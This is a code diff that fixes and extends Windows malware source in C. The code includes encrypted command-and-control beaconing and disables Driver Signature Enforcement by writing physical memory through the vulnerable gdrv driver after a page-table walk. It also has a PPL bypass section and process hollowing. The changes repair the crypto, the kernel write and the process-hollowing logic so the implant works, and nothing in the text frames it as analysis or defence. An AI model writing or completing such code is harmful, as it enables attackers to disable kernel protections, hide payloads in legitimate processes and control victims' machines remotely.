@@ -168,7 +168,8 @@ pNtWriteVirtualMemory NtWriteVirtualMemory = NULL;
 
 // ==================== FORWARD DECLARATIONS ====================
 ULONGLONG FindPattern(BYTE* base, DWORD size, BYTE* pattern, DWORD patternLen);
-ULONGLONG WalkPageTable(PVOID virtualAddr);
+ULONGLONG WalkPageTable(HANDLE hDevice, PVOID virtualAddr);
+ULONGLONG ReadPhysicalQword(HANDLE hDevice, ULONGLONG physAddr);
 BOOL AesEncrypt(BYTE* plaintext, DWORD plaintextLen, BYTE** ciphertext, DWORD* ciphertextLen);
 BOOL AesDecrypt(BYTE* ciphertext, DWORD ciphertextLen, BYTE** plaintext, DWORD* plaintextLen);
 BOOL SendBeaconToC2(PBEACON_DATA beacon, PC2_TASK task);
@@ -212,7 +213,7 @@ VOID InitNtFunctions() {
 
 // ==================== SINGLE INSTANCE ====================
 BOOL EnsureSingleInstance() {
-    HANDLE hMutex = CreateMutexW(NULL, TRUE, (LPCWSTR)g_mutex_name);
+    HANDLE hMutex = CreateMutexA(NULL, TRUE, g_mutex_name);
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         if (hMutex) CloseHandle(hMutex);
         return FALSE;
@@ -348,13 +349,13 @@ BOOL AesEncrypt(BYTE* plaintext, DWORD plaintextLen, BYTE** ciphertext, DWORD* c
     BCRYPT_KEY_HANDLE hKey = NULL;
     if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
         return FALSE;
-    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)g_aes_key, strlen(g_aes_key), 0);
+    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, (ULONG)(wcslen(BCRYPT_CHAIN_MODE_CBC) * sizeof(WCHAR)), 0);
+    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)g_aes_key, 32, 0);
     DWORD paddedLen = ((plaintextLen + 15) / 16) * 16;
     *ciphertextLen = paddedLen + 16;
     *ciphertext = (BYTE*)malloc(*ciphertextLen);
     if (!*ciphertext) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0); return FALSE; }
-    NTSTATUS status = BCryptEncrypt(hKey, plaintext, plaintextLen, NULL, (PUCHAR)g_aes_iv, strlen(g_aes_iv), *ciphertext, *ciphertextLen, ciphertextLen, BCRYPT_BLOCK_PADDING);
+    NTSTATUS status = BCryptEncrypt(hKey, plaintext, plaintextLen, NULL, (PUCHAR)g_aes_iv, 16, *ciphertext, *ciphertextLen, ciphertextLen, BCRYPT_BLOCK_PADDING);
     BCryptDestroyKey(hKey);
     BCryptCloseAlgorithmProvider(hAlg, 0);
     return BCRYPT_SUCCESS(status);
@@ -365,12 +366,12 @@ BOOL AesDecrypt(BYTE* ciphertext, DWORD ciphertextLen, BYTE** plaintext, DWORD* 
     BCRYPT_KEY_HANDLE hKey = NULL;
     if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
         return FALSE;
-    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)g_aes_key, strlen(g_aes_key), 0);
+    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, (ULONG)(wcslen(BCRYPT_CHAIN_MODE_CBC) * sizeof(WCHAR)), 0);
+    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)g_aes_key, 32, 0);
     *plaintextLen = ciphertextLen;
     *plaintext = (BYTE*)malloc(*plaintextLen + 1);
     if (!*plaintext) return FALSE;
-    NTSTATUS status = BCryptDecrypt(hKey, ciphertext, ciphertextLen, NULL, (PUCHAR)g_aes_iv, strlen(g_aes_iv), *plaintext, *plaintextLen, plaintextLen, BCRYPT_BLOCK_PADDING);
+    NTSTATUS status = BCryptDecrypt(hKey, ciphertext, ciphertextLen, NULL, (PUCHAR)g_aes_iv, 16, *plaintext, *plaintextLen, plaintextLen, BCRYPT_BLOCK_PADDING);
     BCryptDestroyKey(hKey);
     BCryptCloseAlgorithmProvider(hAlg, 0);
     if (BCRYPT_SUCCESS(status)) (*plaintext)[*plaintextLen] = 0;
@@ -865,10 +866,12 @@ BOOL DisableDSEviaGdrv() {
         if (ciOptionsAddr) {
             DWORD* relAddr = (DWORD*)(ciOptionsAddr + 2);
             ULONGLONG targetAddr = ciOptionsAddr + 6 + *relAddr;
-            ULONGLONG physicalAddr = WalkPageTable((PVOID)targetAddr);
+            ULONGLONG physicalAddr = WalkPageTable(hDevice, (PVOID)targetAddr);
             if (physicalAddr) {
-                BYTE newValue = CI_OPTIONS_DISABLE_DSE;
-                DeviceIoControl(hDevice, GDRV_IOCTL_WRITE_PHYSICAL, &physicalAddr, sizeof(physicalAddr), &newValue, sizeof(newValue), &bytesReturned, NULL);
+                BYTE writeBuf[16] = {0};
+                memcpy(writeBuf, &physicalAddr, sizeof(physicalAddr));
+                writeBuf[8] = CI_OPTIONS_DISABLE_DSE;
+                DeviceIoControl(hDevice, GDRV_IOCTL_WRITE_PHYSICAL, &writeBuf, sizeof(writeBuf), NULL, 0, &bytesReturned, NULL);
             }
         }
     }
@@ -911,8 +914,39 @@ ULONGLONG FindPattern(BYTE* base, DWORD size, BYTE* pattern, DWORD patternLen) {
     return 0;
 }
 
-ULONGLONG WalkPageTable(PVOID virtualAddr) {
-    return (ULONGLONG)virtualAddr;
+ULONGLONG ReadPhysicalQword(HANDLE hDevice, ULONGLONG physAddr) {
+    ULONGLONG value = 0;
+    DWORD bytesRet = 0;
+    DeviceIoControl(hDevice, GDRV_IOCTL_READ_PHYSICAL, &physAddr, sizeof(physAddr), &value, sizeof(value), &bytesRet, NULL);
+    return value;
+}
+
+ULONGLONG WalkPageTable(HANDLE hDevice, PVOID virtualAddr) {
+    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return 0;
+    ULONGLONG va = (ULONGLONG)virtualAddr;
+    ULONGLONG pml4_idx = (va >> 39) & 0x1FF;
+    ULONGLONG pdpt_idx = (va >> 30) & 0x1FF;
+    ULONGLONG pd_idx   = (va >> 21) & 0x1FF;
+    ULONGLONG pt_idx   = (va >> 12) & 0x1FF;
+    ULONGLONG offset   = va & 0xFFF;
+    for (ULONGLONG cr3 = 0x1000; cr3 < 0x200000; cr3 += 0x1000) {
+        ULONGLONG pml4e = ReadPhysicalQword(hDevice, cr3 + pml4_idx * 8);
+        if (!(pml4e & 1)) continue;
+        ULONGLONG pdpt_pa = pml4e & 0x7FFFFFFFFFFFF000ULL;
+        if (pml4e & 0x80) continue;
+        ULONGLONG pdpte = ReadPhysicalQword(hDevice, pdpt_pa + pdpt_idx * 8);
+        if (!(pdpte & 1)) continue;
+        if (pdpte & 0x80) return (pdpte & 0x7FFFFFFFFFFFC00000ULL) | (va & 0x3FFFFFFF);
+        ULONGLONG pd_pa = pdpte & 0x7FFFFFFFFFFFF000ULL;
+        ULONGLONG pde = ReadPhysicalQword(hDevice, pd_pa + pd_idx * 8);
+        if (!(pde & 1)) continue;
+        if (pde & 0x80) return (pde & 0x7FFFFFFFFFFFF00000ULL) | (va & 0x1FFFFF);
+        ULONGLONG pt_pa = pde & 0x7FFFFFFFFFFFF000ULL;
+        ULONGLONG pte = ReadPhysicalQword(hDevice, pt_pa + pt_idx * 8);
+        if (!(pte & 1)) continue;
+        return (pte & 0x7FFFFFFFFFFFF000ULL) | offset;
+    }
+    return 0;
 }
 
 // ==================== PPL BYPASS ====================
@@ -1394,8 +1428,8 @@ BOOL ProcessHollowing(LPCWSTR targetProcess, LPCWSTR payloadPath) {
     GetThreadContext(pi.hThread, &ctx);
     NtUnmapViewOfSection(pi.hProcess, (PVOID)ctx.Rdx);
     PVOID imageBase = NULL;
-    DWORD_PTR pebAddr = 0;
-    NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pebAddr, sizeof(pebAddr), NULL);
+    PROCESS_BASIC_INFORMATION pbi = {0};
+    NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
     if (status == 0) {
         PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peData;
         PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peData + pDos->e_lfanew);
